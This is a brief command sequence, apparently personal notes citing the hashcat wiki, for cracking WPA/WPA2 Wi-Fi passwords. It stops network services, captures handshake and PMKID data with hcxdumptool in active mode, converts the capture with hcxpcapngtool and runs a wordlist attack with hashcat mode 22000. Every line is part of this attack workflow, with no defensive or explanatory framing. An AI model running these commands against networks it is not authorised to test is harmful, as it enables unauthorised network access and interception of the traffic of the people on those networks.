# reference https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
systemctl stop NetworkManager.service
systemctl stop wpa_supplicant.service
hcxdumptool -i interface -o dumpfile.pcapng --active_beacon --enable_status=15
systemctl start wpa_supplicant.service
systemctl start NetworkManager.service
hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt